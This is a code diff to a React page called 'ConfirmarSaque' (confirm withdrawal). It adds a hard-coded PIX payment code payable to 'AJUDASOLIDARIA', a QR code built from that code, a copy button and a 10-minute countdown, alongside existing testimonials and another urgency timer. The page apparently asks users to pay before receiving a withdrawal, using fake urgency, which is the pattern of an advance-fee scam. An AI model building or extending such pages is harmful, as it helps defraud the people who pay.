@@ -48,8 +48,15 @@ const TESTIMONIALS = [
   },
 ];
 
+const PIX_CODE =
+  "00020101021226820014br.gov.bcb.pix2560qrcode.a55scd.com.br/v1/54fe3206-7e6a-46b8-bd06-5a996e7870f52040000530398658025802BR5914AJUDASOLIDARIA6008SAOPAULO62070503***6304A1B2";
+
 function ConfirmarSaque() {
   const [seconds, setSeconds] = useState(6 * 60 + 17);
+  const [showPix, setShowPix] = useState(false);
+  const [pixSeconds, setPixSeconds] = useState(10 * 60);
+  const [showToast, setShowToast] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     const id = setInterval(
@@ -59,8 +66,37 @@ function ConfirmarSaque() {
     return () => clearInterval(id);
   }, []);
 
+  useEffect(() => {
+    if (!showPix) return;
+    const id = setInterval(
+      () => setPixSeconds((s) => (s > 0 ? s - 1 : 0)),
+      1000,
+    );
+    return () => clearInterval(id);
+  }, [showPix]);
+
+  const openPix = () => {
+    setShowPix(true);
+    setShowToast(true);
+    window.setTimeout(() => setShowToast(false), 6000);
+  };
+
+  const copyCode = async () => {
+    try {
+      await navigator.clipboard.writeText(PIX_CODE);
+    } catch {
+      // ignore
+    }
+    setCopied(true);
+    window.setTimeout(() => setCopied(false), 2000);
+  };
+
   const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
   const ss = String(seconds % 60).padStart(2, "0");
+  const pixMm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
+  const pixSs = String(pixSeconds % 60).padStart(2, "0");
+
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(PIX_CODE)}`;
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
